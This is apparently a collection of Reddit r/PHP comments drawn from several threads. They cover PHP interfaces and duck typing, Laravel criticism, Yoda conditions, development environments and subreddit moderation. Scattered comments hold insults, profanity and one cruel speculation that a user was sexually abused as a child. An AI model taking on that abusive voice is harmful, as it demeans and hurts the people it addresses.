That’s the power of abstractions, one way of implementing it is using interfaces. But in PHP and other dynamic languages you can have the same result by duck-typing. So what puzzles me is why PHP as a dynamic language decided to have interfaces.
I see that and it seems to be a simple converter script on top of that dependency.
You can't have the same result by duck-typing, because where's the central place where the requirements are specified, by name? Let's say classes A, B, C need interface PaymentProcessor, and X, Y, Z implement it. Now let's remove the interface. What one location will A, B, C refer to about their payment processor needs? How about X, Y, Z. What one location will they refer to as to what they're implementing? And lastly how would X, Y, Z ensure that they're indeed receiving the right object? You're be "duck-type" testing method by method, result by result? That's a whole lot of pointless boilerplate, effort, and performance loss only to still risk in the end accidental interface overlap (say there's a method by the same name, but it doesn't do *exactly* the same thing as you think) and therefore unpredictable behavior. Interfaces are combining components in a clean, predictable, standardized way. For example when a computer offers a USB port, and you have a USB device, you know you can hook them and they'll work together. That's because they both provide their respective ends of the USB interface. The simple moniker "USB" and the familiar shape of the USB port is all you need to know that these devices will work together. It serves as a central place to specify the standards that devices implement to communicate with each other. That's the power of an interface. It's absolutely irrelevant to whether a language is dynamic or not. Even in statically typed languages, dynamic dispatch is not a unique requirement of interfaces. Abstract classes need it, and subclasses (i.e. class with a parent) that override parent methods also need it. And in languages that implement closures, they also often are implemented via dynamic dispatch. Don't confuse the low-level underlying mechanics of a language with the high-level architectural goals of the primitives it provides. Interfaces (or an alternative, say like protocols in Objective-C, traits in Rust etc.) serve modular architecture. You don't need interfaces to make things work in small scale, when you have less than a dozen parts to wire together and you control everything. But once multiple people work together on a project, or a project combines components built by multiple people (or multiple teams), interfaces become an important communication tool and type safety feature to ensure the parts fit correctly together.
I see it similarly. I have a Trait I use in my projects to provide some basic functionality (e. g. return an array of all class constants) and then just use that with static constants. It's not pretty, but it works reasonably well and gets the job done really nicely.
I agree 100% and that’s why I use interfaces. However you can achieve that level of abstraction with duck-typing, you need more checks but you can do it. Probably purity is why other dynamic languages don’t even consider to have interfaces. In a way they’re right though, they’re following a line of thought.
&gt; However you can achieve that level of abstraction with duck-typing, you need more checks but you can do it. You're still missing the point I made and the question I asked: what is the central information where you document this shared behavior, required by multiple parties, and provided by multiple parties? Would you just throw it up in a text file somewhere in your code repository and then mention it by filepath and filename in your class PHPDoc? Also what kind of an argument is to say "you can do a subset of it by writing lots more code without interfaces"? Do you think writing extra code to maintain and slow you down at runtime is a benefit? &gt; Probably purity is why other dynamic languages don’t even consider to have interfaces. In a way they’re right though, they’re following a line of thought. As I said, many of those "pure" dynamic languages have either added interfaces, or are considering it in their next release. So your facts are outdated.
It's either full of new people asking for help in the wrong place or everyone telling you someone is wrong and their opinion is right and the most correct. Some articles are good but no one stays for the comments.
Please keep it civil.
because Symfony sucks \^\^
That blog post is pretty trash though. He complains about facades, when they can be injected. Nothing is stopping stupid developers from creating wrappers to do hackish things with the framework. He complains about the auto wiring requiring additional work to do things outside of its core functionality. The only valid complaint he had was about Active Record. It's incredibly stupid to blame the tools for your inability to use them without hurting yourself. Take some classes, read some books, and stop blaming other developers for your inability to write good software.
I see that you posted this over in /r/javascript too. I see no PHP sources.
PHP has nominal typing and dynamic dispatch only because Java works that way and that was popular in the php core team at that time. Clearly a dynamic language is better served by structural typing and and overloading functions using pattern matching. 
You are right but the project is language agnostic, it is a dataset. The idea is to create a wrapper to let the data be easily usable on all languages. All maps are released on npm, and soon will be released on pip (python) and gopm (golang) and I was wondering if it may be interesting for someone to do the same on composer.
https://www.reddit.com/r/PHP/comments/72qm6p/is_there_a_open_source_laravel_app_which_follows/dnlh0q4/
Sounds like you're missing the whole type safety aspect of enumerations with your crappy hand-rolled solution because of your NIH syndrome. There are [good enumeration libraries](https://github.com/eloquent/enumeration) out there you should be using.
Type safety.
then why are you here?
Typical shitty moderators, delete Taylor’s comment but leave the uncivil comment above it. 
Is shit-eating grin considered an insult? In my culture it's used in the sense of "big, goofy smile". I thought it was a compliment in the context.
I’m interested but the documentation seems to slim to get (me) started. 
It's not an insult anywhere I've ever seen, especially compared to telling someone to go F themselves.
No.
React is back, Not sure if you saw. UPDATE 2017-09-23 - https://github.com/WordPress/gutenberg/issues/2733
I like ActiveRecord. Its a lot less annoying than mapper and easier to maintain. I'll pick AR every time over something heavy like doctrine.
I can say, without shadow of a doubt, that no-one cares.
But lets not pretend that we don't all take a shit in this toxic hole ourselves from time-to-time.
really, i can't understand your confusion, it was clearly a derogatory statement, which you then repeat after you delete it. What culture are you part of where that is a compliment? and yet "go f yourself" isn't just a friendly way of saying "haha, get out of here old friend!" ...
You are perfectly right! I'll try to do my best to improve it in the following days. What kind of information you would like to see to get you started?
You're probably already aware, but for those who aren't : it's quite common to introduce a _comments field in your JSON file. Not ideal, better than nothing
He deleted his old account but he has another account. https://twitter.com/taylorotwell/status/933152398159122432 He quitted because of insulting, harassing, bullying comments like this one: https://www.reddit.com/r/softwaredevelopment/comments/7dczhi/ddd_hexagonal_onion_clean_cqrs_how_i_put_it_all/dq43jb9/ That specific user getts kicked out of reddit once in a while and then just creates a new account to keep insulting ppl. He adds nothing new to the community, only comments on others, and usually in a very negative light. When I notice he was kicked out and came back with another account, I just block him. 
I have only ever seen a single piece of code where the expected complexity of library functions mattered, and it was an AutoCAD to SVG converter. Everywhere else the PHP bottlenecks were always database queries (doing them in a loop, having a poorly optimized ORM or doing big unoptimized queries), and deeply nested loops iterating over arrays in the inner loop.
If anyone was so worried about type safety, I would say that PHP is a bad choice in the first place. Although it's getting better, there is still a long way till it can be beat a language with types designed in.
Had a bad day?
 xdebug.force_display_errors = 1 xdebug.scream = 1 if only i knew about this sooner in my life... thanks so much, this is a life-/jobsaver! 
Actually, I don't understand your confusion at all. And if you are really, really, (really!) are confused by this kind of thing, then you shouldn't be a moderator.
no you didn't lol
I mean, some of it he brought on himself. For instance he dismissed the symfony routing library being a major dependency because Laravel only uses it to build routes. I felt I was quite justified in asking what else exactly the library does besides that, or how routing want a major part of the target applications for Laravel. 
On mobile sucks sorry
I've found that this is pretty much the case in most online programming communities. Forums, IRC/slack, Stackoverflow etc... I haven't really found any to be much better than each other. Although I do think Reddit's voting system helps a lot. Personally I think the "this isn't a support forum/irc channel" thing is basically going to be an ever-ongoing unwinnable uphill battle. If it were up to me, I'd just give up and let the /r/linux /r/php etc just become support subs, and create separate subs for all the non-support stuff like news. 
What sucks?
I wasn't using Laravel for long enough to really have a proper opinion. But from reading the version upgrade guides, there does seem to be quite a lot of breaking changes. Even when Phalcon was completely rewritten, and in another language altogether (v1 was pure C, v2 was zephir transpiled to C)... there were hardly any breaking changes at all. I think I had to change like 2 lines of code in my project for v1 -&gt; v2. I'm not advocated Phalcon over Laravel, I'd probably more likely to use Laravel if I had to work with other devs. And it does seem to evolve quite quickly, which is a good thing. It just kind of felt like Debian vs Arch in terms of consistency.
There is no responsive and the app is impossible to be used. I have a galaxy s8. I mean the previews you show in the readme at least. 
Hey, can you please give some examples of some newer patterns that are better compared to how Laravel does things? And why? I'm not disagreeing at all, or here to argue, I don't even use Laravel. Just genuinely curious about new emerging patterns, as over the next few months I making major changes to my whole webdev stack. I'm moving over to Node+React. And I'm interested in learning about stuff like Active Record vs Data Mapper. I've slowly been evolving my patterns/skills over the last 18 years. But making much much bigger changes over the next year.
Yes geojson.io is quite slow. Try the previews in the bottom of the page that uses mapshaper.
A typical scenario would be centering the map arou d a specific geocordinate and then putting something on it - in my scenario it would be car positions
At least you seemed to care enough to click on the thread and leave a comment. Very thoughtful of you :)
&gt; Lint : linting is using ‘php -l’ on every command in your code. Do it as daily hygien, and avoid commiting uncompilable files. It was so useful when moving to PHP 7.0, but sadly, it’s very quiet for PHP 7.2. You're sad that your code doesn't break in PHP 7.2?
&gt; audit your code and improve your coding These are prisoners. I'm going to imprison them... in prison.
It is my sworn duty to downvote all laravel threads. I will not fail my mission.
I read the article and found it quite interesting. What would you recommend/use if you would have to develop an API or app with a long lifespan?
Alright, alright, you are right. 
The more compatibility, the better. When the code has to break anyway, I'd rather have lint tell it to me early, rather than later, at execution. PHP 7.0 was great for that. 
that table needs some horizontal lines
Do you have examples for that?
Sharing my library https://packagist.org/packages/happy-types/enumerable-type
Keep the license in mind before using this: - 1.4. - Creation of "Software as a Service" (SaaS) application(s). (eg. generators, etc) - NO
Whats the story on unicode support? And multicore? Im torn on using PHP becuase of a bad time i had previousy with unicode.
Even in statically typed languages one could use reflection to construct classes on the fly to mock stuff.
Read up on functional versus OOP. React and Node are heavily based on functional programming concepts.
This don't belong here.
I like it, but all the animations are way too slow and feel laggy. Things like checkboxes should be really fast, but this takes like 250ms or so and doesn't feel good at all to use.
PHP?
I actually just wrote a tool to translate from Protobuf enums to static maps of strings for their metadata. I have a lot of enums (50+) so it would be massively time consuming to modify every time, for each language our devs use. Basically doing templating with a for loop to write out every possible value into enum =&gt; string maps and string =&gt; enum in certain cases. This gets generated along with the protobuf code, so there's a reasonable guarantee that it will match.
I have rewritten, as part of a team, a major global online retailers full e-commerce system using Laravel which handles millions of views per day and multi-million £ worth of transactions each day also. The rewrite was completed 12 months ago and I can confirm that it is working perfectly okay with no issues at that scale. Now it depends on what you call "complex" but from my 12 years experience in the web field, this scale of system (interacting with multiple 3rd party systems including a manufacturing system from the 70s written in a language no longer even supported by the company who invented it) is what I would rank as in the higher levels of complexity. 
I wouldn't say that's why he deleted his Reddit account(He also has a new Reddit account.) Taylor isn't someone who could handle the level of criticism in /r/php, even if it was valid. He would react in an emotional way and it would just go down hill from there. IMO it's respectable that he recognized that his Reddit account was detrimental to his cause and/or personal state because of the interactions he had. On the whole I wouldn't call /r/php toxic. But there are absolutely assholes who will attack users/ideas if it's based around a package that they don't like. /r/php is part of my 'news crawl' in the mornings at work. The vast majority of conversations I come across are reasonable. 
&gt; EDIT: classic example of what I'm talking about To be fare, that example kind of goes against your point. It's one person saying something then a bunch of people calling him out on it and it's at -41 points. So I wouldn't call that the general attitude by any stretch of the imagination.
&gt; DO NOT USE THIS ON A SERVER! Meant for personal use only. Why? Whats stopping it being used on a "server"
Judging by his other comments a bad life*.
Until users like saltub are banned this is certainly a toxic community. There is no moderation beyond removing spam long after it's posted.
Personally I've never seen that phrase to be an insult. A shit eating grin to me has always been a kind of devilish smile. From Wictionary &gt; (idiomatic, vulgar) A broad smile indicating self-awareness that may suggest self-satisfaction, smugness, discomfort, or embarrassment Dictionary.com &gt; An expression of smug satisfaction; a stupid gloating look (the former is what I'm used to) 
It's not about the framework. It's about writing maintainable code, which by definition, shouldn't depend on your framework. It's irrelevant.
w0w
I just can't agree with labeling a whole subreddit as 'toxic' based on some obvious trolls though.
My god, you sound miserable.
Tbh types don’t really help catch bugs..sometimes they warn you about stuff you would notice anyway..I more like see the benefit in documentation and the fact that it forces you to think more about what you do. But in general I just don’t see the benefits for a single developer but see benefits definitely for teams
That is........uh, many words.
&gt; w0w Sorry, I only replied because I was under the impression you was after an intellectual, adult conversation about the topic.
Us mods rely heavily on the modqueue to know where to look. If you see rule-breaking behaviour, please be sure to report it. We're all people with full-time development positions, and are here on a volunteer basis. We don't have time to pore through every thread looking for incivility, which itself is a judgement call that we give people a lot of leeway on. I do always read through threads like these to see if there's something that could be done better, but there is little here that is actionable without fundamentally changing what /r/PHP is about. I've always tried to maintain it as a place where people can be as direct and critical as they feel they need to be, as long as they're not being outright abusive. Some people aren't comfortable with that, and there are more appropriate communities for them if they so choose.
Agreed, possibly raped as a child, he's angry at everything
Carnage's post specificly said that he would not recommend Laravel for a long lifespan project. I'm just curious what would be a better choice and why
I'll give you some complaints about Laravel. Some might be outdated, some might be because we don't use PHP at work as much because it doesn't work well for what we do. Why are all these functions global (https://laravel.com/docs/5.4/helpers)? At least make them classes so they are easily testable with your code. It's also confusing and makes you wonder is this function Laravel specific or is a native function. Its tightly couples your code to Laravel and refactoring this to another framework or project won't be easy. More global functions: Why aren't aren't they classes so I can easily mock them for tests? Lets take the dispatch function: https://laravel.com/docs/5.4/helpers#method-dispatch. How to I test if it succeeds or fails, how do I know if my code handles this correctly? This is older and has since been changed, but this was never acceptable: https://github.com/laravel/framework/blob/5.3/src/Illuminate/Validation/Validator.php. A class with almost 3.4K lines, almost 200 methods. One of the main faces of Laravel says that type hints, return types, interfaces and traits at "visual debt" and make code dirty? https://laracasts.com/series/php-bits/episodes/1. All of these features make your code easier to maintain, produce less bugs and make it easier to build upon. It's basically saying ignore all of the new features that other languages have and go back to PHP4 days. They don't follow SemVer, this is nitpicking, but it would be nice. Here's a key feature was just removed (https://github.com/laravel/internals/issues/391) and not deprecated like a sane library/platform would do. I'd much rather have deprecations. mysql_* functions were terrible, but they were deprecated for a few versions of PHP and then finally removed in 7, not cut off randomly. I'm not a fan of Facades, I feel they are scary to use because they allow you to add framework specific dependencies. Blade has dangerous features such as injecting variables from anywhere. Some people say it's just a tool and you don't have to use all these features. But they are in the framework and are the way advertised or demoed on the site. So you are going to have junior developers coming in and you have to make sure they don't use some of these hacks. Where are they calling these global functions? Where are they injecting these variables from? Why are they injecting a repository here and querying it? Take everything I say and do your own research because like I said some of it's outdated (but valid around the time he rage quit reddit). If you use Laravel and follow good practices (sometimes not what they tell you to do), it can work. I'd just not prefer something that allows and recommends me to do it this way out of the box.
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [laravel/framework/.../**Validator.php** (5.3 → 4ab4e5f)](https://github.com/laravel/framework/blob/4ab4e5f9470939e1c853196e1d5c84830c8b22e3/src/Illuminate/Validation/Validator.php) ---- ^(Shoot me a PM if you think I'm doing something wrong.)^( To delete this, click) [^here](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply dq70cck.)^.
The point is that if your system is well architected then any framework will be maintainable long term. Backwards compatibility comes in to play when you *depend* on functionality in the frameworks current state, when you're coupled to the framework. Choosing a framework mostly comes down to preference. What does your team have experience with? Does the framework have the features you need? Will it save more development time than the other framework? If it doesn't have X then you may have to write it yourself. If other framework has X then maybe it's the correct choice. There isn't a perfect solution. Determine what tradeoffs you'll need to make and weigh your options accordingly.
It's a double edge sword. While it can restrict things, kind of like in validation of input, but if PHP were to get strict typing, we would need to have better overloading, or force everyone to create methods/functions that are named like this: myFunctionForArray, myFunctionForString, myFunctionForInt... Then do some if/else/switch based on data type, which basically just make what we already just that more complicated...
1. I would much rather use Docker or Vagrant. 2. macOS High Sierra comes with PHP 7.1.7
It's not limited to one subreddit.
*you're
I love mapbox, but I use google maps because of the pricing &amp; limits.
That project is not related with any of the product you mentioned. I It's fully based on open dataset.
Thank you
&gt; Apple Macs are not used in production but for local development This.
l0l
Its not safe, it makes use of mkdir, and sets the directory to 700
Yup.
Re your edit: Yes, and docker is a wonderful solution and I encourage all new projects to be setup this way and to migrate your current projects into a docker container. However for my inherited apps that I haven't migrated and for whipping up a quick app/script for a one time solution, running it on your machine can be the quickest solution. But you're (wink) right, I'll do another guide for getting started and migrating a project into a docker container while debugging it and easily launching it in AWS. And again, thanks for the grammar check.
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/lolphp] [Popcorn time (lolphp &amp; lolaravel)](https://www.reddit.com/r/lolphp/comments/7et6or/popcorn_time_lolphp_lolaravel/) &amp;nbsp;*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))*
Exactly. I have no idea why anyone would automatically assume it was an insult and I can't even begin to imagine why anyone would think "go fuck yourself" is an appropriately measured response.
I've got my Dev environment set up in to the OS and didn't have an issue with the upgrade to High Sierra, however I'd be very interested in a guide for migration to Docker.
Wasn't it fixed in 7.2?
Seriously, stop sticking dev stuff into your desktop operating system. Instead use Vagrant or Docker to create reproducible development environments. Vagrant with shell script provisioning is a great place to start. 
Static code analysis and better detection of errors... I'm always in favour of my code exploding at the first possible point rather than potentially flowing through several mutations or processes before it breaks something deeper and causes much greater problems. I agree with /u/Ellisgl through, we desperately need function overloading.
Doesn't really belong here, but... 1. Needs npm installation. 1. There seems to be a problem with the heights on the labelled progress bars (Chrome Version 62.0.3202.62).
Yeah. But compare /r/PHP to /r/javascript or any other communities, and you will see the difference at once. Yes, the most toxic users gets downvoted, but in the other communites, they are almost non existing
was it?
It's a defensive programming technique to avoid the common error: if ($x = 1) if ($x == 1) If you put the constant on the left, the first case would generate an error instead of silently allowing you to make a mistake.
I wonder how much it costs to look at type over contents. Maybe thinking that dereferencing a constant to compare types might be less costly. I'm interested to know myself.
Just for the record, it is called [Yoda Conditions](https://en.wikipedia.org/wiki/Yoda_conditions)
**Yoda conditions** In programming jargon, Yoda conditions (also called Yoda notation) is a programming style where the two parts of an expression are reversed from the typical order in a conditional statement. A Yoda condition places the constant portion of the expression on the left side of the conditional statement. The name for this programming style is derived from the Star Wars character named Yoda, who spoke English in a non-standard syntax. Yoda conditions are part of the WordPress and Symfony coding standards. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/PHP/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^| [^Donate](https://www.reddit.com/r/WikiTextBot/wiki/donate) ^] ^Downvote ^to ^remove ^| ^v0.28
&gt; We're all people with full-time development positions mods are 10xers confirmed edit: fuck wrong sub, couldn't tell
**Yoda conditions** In programming jargon, Yoda conditions (also called Yoda notation) is a programming style where the two parts of an expression are reversed from the typical order in a conditional statement. A Yoda condition places the constant portion of the expression on the left side of the conditional statement. The name for this programming style is derived from the Star Wars character named Yoda, who spoke English in a non-standard syntax. Yoda conditions are part of the WordPress and Symfony coding standards. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/PHP/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^| [^Donate](https://www.reddit.com/r/WikiTextBot/wiki/donate) ^] ^Downvote ^to ^remove ^| ^v0.28
100% this. Not only that, there are a slew of vagrant boxes ready to go you can download to be instantly up and running. For instance I develop for SugarCRM a lot for a few clients. Couple guys have some vagrant boxes setup to make my life easy. 
IMO it's better to write things in a normal human-understandable way, and then use checking tools to prohibit assignment within if statements. However, some people may have learned at the trick from before proper tooling existed
Isn't what you're trying to do return type covariance? If so, imho, it's one of the most important features missing from PHP. It's been discussed in [this RFC](https://wiki.php.net/rfc/object-typehint) but of course the vote went against it.
I see. I totally agree with your reply and your comments about the article. IMO it's a big plus in Laravel that everything has an interface, so you can basically replace the whole Laravel core with your implementation.
Did you mean to type co- and contravariance? Also, if something is obviously desirable, and yet hasn't been implemented, it'd be a more productive conversation to ask "why hasn't this been implemented?", rather than starting of with an emotional "this is ridiculous".
Isn't this a violation of the [Liskov](https://en.wikipedia.org/wiki/Liskov_substitution_principle) principle?
**Liskov substitution principle** Substitutability is a principle in object-oriented programming stating that, in a computer program, if S is a subtype of T, then objects of type T may be replaced with objects of type S (i.e. an object of type T may be substituted with any object of a subtype S) without altering any of the desirable properties of T (correctness, task performed, etc.). More formally, the Liskov substitution principle (LSP) is a particular definition of a subtyping relation, called (strong) behavioral subtyping, that was initially introduced by Barbara Liskov in a 1987 conference keynote address titled Data abstraction and hierarchy. It is a semantic rather than merely syntactic relation because it intends to guarantee semantic interoperability of types in a hierarchy, object types in particular. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/PHP/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^| [^Donate](https://www.reddit.com/r/WikiTextBot/wiki/donate) ^] ^Downvote ^to ^remove ^| ^v0.28
We use php 7 for a turkish social network and it creates zero problems for us. mbstring extension works great.
Oh, I agree, I think it's a terrible practice. I was just answering OP's question in an unbiased way.
PHP treat subclasses as perfect substitutes. If you can't do something with subclass because it return incompatible class from one of it's methods, then interchangability is not there. BTW OOP is ill defined term, with many interpretations. What you advocate for is OOP where classes are **NOT** types. That's heavy trade-off, but generally have nothing to do with OOP itself.
Here's a good explanation as to why this isn't possible (yet): https://www.reddit.com/r/PHP/comments/3x9d9v/questions_about_php_7s_return_types/cy2tmxs/ Basically it's down to the fact that PHP files can have multiple classes and namespaces, which means that to fully understand them you need to do two sweeps of the file, one to collect the classes used, and the second to connect the dots.
It would be interesting to explore the provenance of that phrasing because the practice/idea has been around a lot longer than Star Wars.
Just from a programming view, not necessarily performance, I have always thought it was better to do positive condition checks over negative checks. if($variable === null) { } or if($variable instanceof ClassOrInterface) { } instead of if($variable !=== null) { }
Sometimes I like to use: if (null === $article = Articles::find(1)) { /* article not found, return or exit here */ } And then you can use $article variable and be sure that article is founded
Besides the defensive thing, it's sometimes more readable if the other side of the expression is quite long or itself contains an assignment.
&gt;Code clarity. You can assert that something is a `Duck` Nitpick: I think a clearer example would be `Quackable`, since `Duck` automatically implies something about ancestry just based on regular usage of the word.
People are afraid of their own dumb mistakes. Don't do this! It's a bad practise that makes your code much less readable. http://www.dereuromark.de/2015/10/15/avoid-yoda-conditions/
Go further ``` if(ClassOrInterface instanceof $variable) { } ```
I believe there was a performance reason as of why it was voted against, I could be wrong though.
That is right, most commonly in this form: if (null !== ($foo = maybeFooMaybeNot())) { // use $foo }
All that to save a single line of code?
That's irrelevant to this particular issue. You could reverse your statement and it would still work just fine, and be more readable. e.g. `if ($article = Article::find(1) === null)` or even just `if (!$article = Article::find(1))`
&gt; It's been discussed in this RFC No, that was discussing it specifically for the special case of the parent method having a return type of object, allowing the overriding child methods to have other class types as the return type. It wasn't discussing general covariance. I believe the problem with general covariance is that you can quite easily get into case where there are circular dependencies between the defintions of 3 (or more) classes, which makes it not possible to load them in any order.
Yep, why not? Did it really looks weird?
I know it works but it's silly. The point in the Yoda condition is to prevent accidental variable assignment. You can't assign value to `$variable` with `instanceof`.
It's generally considered a bad practice to put assignment inside of conditions since it harms readability.
 Please visit /r/phphelp for help, or connect to ##php on Freenode IRC (nickserv registration required).
Oh, that hurts. Only thing that would pass code review where I work would be: $article = Articles::find(1); if ($article === null) { /* article not found, return or exit here */ }
You're right, I can reverse it, but I still think that the null === $article = ... more readable than !$article = ... I'm also not sure that $article = Article::find(1) === null works predictable, because when I see if (($article = Article::find()) === true) { /* this code will always work */ } I cannot be sure that your works as I expect
Would this not be a scenario here you'd use an interface? 
The built-in API is for ASCII strings and binary data. The mbstring, iconv and intl extensions, which come with most PHP distributions these days, and are very easy to obtain, are considered core functionality to PHP and provide all you need to handle Unicode and most other charsets you'll ever need.
Seriously? That works?
Holy shit it works lol?
Your question is about static type annotations. It has nothing to do with OOP. The type system in PHP is a work in progress. It has been for a long time. Return types couldn't even be nullable until recently. When you can't express what you want with native type annotations, use PHPDoc annotations and move on. No, it's not ideal. No, I don't like it. But it's a way to go. PHPDoc annotations are a lot more permissive, and support things like union types, limited generics and so on. And editors and IDEs make use of this information. Good stop-gap approach.
``` if (is_null($oArticles-&gt;find(1))) { /* article not found, return or exit here */ } ```
https://stackoverflow.com/questions/4662588/whats-the-difference-between-is-nullvar-and-var-null
You can be sure if you've memorised the order of operations for the language you're writing in! == is higher priority than =, so it definitely works. But adding explicit parentheses is always a good practise to ensure maximum readability.
It was a joke, making code worse so it definitely won’t be allowed
Alright, thanks.
I always hope it's a joke... but I often end up disappointed. :(
I don't think it's fair to say that it makes your code *much* less readable. Different people have different opinions, and at most it makes your code marginally less readable. There are lots of other things you can do in an if-statement - if yoda conditions are the worst one in your codebase, you've got a very clean codebase. That said, the current opinion does seem to be against yoda conditions, so, in the interest of standardisation, I think the best advice is probably to avoid them. OTOH, if you've ended up working on a codebase where yoda conditions are the norm, by all means follow along with that tradition.
Because of the higher priority of the comparison, `$article` will be of boolean type without the parentheses. That's probably not what you want.
You're right, I guess the Yoda expression is a little cleaner without the parentheses, then.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
 if($variable !=== null) { } Is there another level of strictness checking I haven't seen yet?
Yep.
haha. oops. No, that's just a typo.
Ideally, some sort of linter or compiler (for compiled codes) would catch these mistakes. In JavaScript, eslint catches these by default.
Delet ur account
Called Yoda Conditions it is, for the record just.
He got tired of himself?
What's the point? Return B as type of A as the contract says.
A lot of people ask for help with a white screen, seemingly without realizing that they could see the error message if they'd just look for it. It's great to see someone telling those people to display their damn errors.
I disagree (personal preference) if you have it the other way you have one less joining bracket )) vs ))), the less of these the better imo!
Really, where is this stated? I’ve seen it a ton especially with cache checking
Hey! This is pretty sweet! Nice job with this. I love the simplicity. Side note, I’m an engineer at Help Scout and the one who maintains our PHP library. Thanks for making and sharing this!
100x upvoting this. 
The most important point in favour of this style, that most people (including yourself) miss, is that because you have organized the expression in this way the braces are not needed. If, like some [zealous clowns](https://www.reddit.com/r/PHP/comments/7etzbh/why_do_people_use_null_variable/dq7h8cd/), you preach only One True Way, you lose the opportunity to perform this optimization.
Only because you're not used to reading it.
Nobody cares what you do in the privacy of your walled garden of unpublished standards.
You are most welcome, clearly it doesn't have everything I am working on that - I made this for work and the methods I have, is what we use but I deff want to expand it.
Hey, you gotta do what works for you! And our lib is definitely behind the times, but a nice big update is in the works. We’re happy to answer any questions about the API if you have any while you’re working on and expanding this. Feel free to reach out! Cheers!
B is still A so you wouldnt break a contract anyway. A simple example would be some sort of a copy() method that returns a copy of the object. for A it would return A anf for B return B whiile still being compatible
Why...?
&gt; B is still A so you wouldnt break a contract anyway. I know. That's why you can leave A as return type, while returning B as an implementation of it. By changing type signature that doesn't really change anything you gain nothing but some arbitrary convenience while opening door to abuse type system at the same time.
People are bastard coated bastards with bastard filling. 
Fair enough, but parenthesis fight against the non-yoda problem. The format I posted resists both common errors (assignment when using yoda, order when not) which is likely the reason for its popularity. Unrelated, I should note it is perhaps as common is not more so to use these for detecting === null c-error conditions and returning.
I actually find having the value on the left hand side improves my comprehension, especially if the right hand side is really long, maybe in the case of an embedded assignment, or a really long or chained function call. Since “null” is really short, I immediately know what I’m checking against before I finished reading. It feels weird to do this for &lt; or &gt; though, so I only do it for equality. My code is consistent with itself at least. Shrug; to each his own.
Think of the next guy who maintains your code. Is he used to it?
Not if he's a closed-minded religious zealot who believes it's my way or the highway.
If you return B while hinting it is A no consumer of your class will be able to actually use its B-specific features. so e.g. you cannot have an abstract factory pattern
It's a pretty thin argument and not a bad practice at all. If `something == something`, order is irrelevant. The examples he provides are arguably poorly written code.
It makes the code marginally less readable and somewhat more Jimmy-proof. You know Jimmy, right? He's the junior programmer who comes along after you. He's why the senior devs keep saying, "God DAMN it, Jimmy." It's important to Jimmy-proof your code as much as possible.
While I despise Yoda conditions, they're part of the WordPress coding standards. I know everybody likes to make fun of WordPress, but the top comment actually makes sense to use these. 
Seriously, stop using Macs.
Code Sniffer / Mess Detector come to mind 
At the time you introduce B-specific features you break the contract. That's what bad naming choice is doing to our brains (I'm looking at you "extends").
I self taught myself how to code (though obviously not well) back in '93 and have been writing software ever since. I have only once in my lifetime made this mistake. Once. It simply isn't worth rewriting your conditions like this given how uncommon the issue is.
I've only made this mistake once in the past 23 years.
Both are normal human-understandable representations. == is **equality** operator Order of operands is **irrelevant**. There is novelty factor at the beginning, but by the 3rd hour you wont notice. On the other hand there is no way to avoid harm of non-yoda conditions no matter developer experience. However there may be alternative solutions. Eg programming fonts with proper ligatures, so that = and == are distinctly different.
&gt; Called Yoda Conditions they are, for the record it is. ftfy
"It's bad practice" is soooo annoying statement. It's urban myth that one is more readable then the other. We are just accustomed to see one of those forms more often then the other. (PS 2 &lt; $variable vs $variable &gt; 2 is pure BS. Business people are as likely to use one form as the other to describe requirements.)
Agreed. It's a very stupid practice.
&gt; Order of operands is **irrelevant.** Not to **humans**. Compare: * If zero is the number of pies I have cooked today... * If the number of pies I have cooked today is zero... And yes, that kind of "lopsided comparison" is usually what happens in these situations, since *all* yoda-conditions involve a really simple constant on one side, because that's the only aspect that makes them any safer than writing things normally.
you dont break the contract by adding features. Every other language supports it for years. Its basically impossible to write any kind of complex application without this. E.g. https://en.m.wikipedia.org/wiki/Abstract_factory_pattern
**Abstract factory pattern** The abstract factory pattern provides a way to encapsulate a group of individual factories that have a common theme without specifying their concrete classes. In normal usage, the client software creates a concrete implementation of the abstract factory and then uses the generic interface of the factory to create the concrete objects that are part of the theme. The client doesn't know (or care) which concrete objects it gets from each of these internal factories, since it uses only the generic interfaces of their products. This pattern separates the details of implementation of a set of objects from their general usage and relies on object composition, as object creation is implemented in methods exposed in the factory interface. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/PHP/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^| [^Donate](https://www.reddit.com/r/WikiTextBot/wiki/donate) ^] ^Downvote ^to ^remove ^| ^v0.28
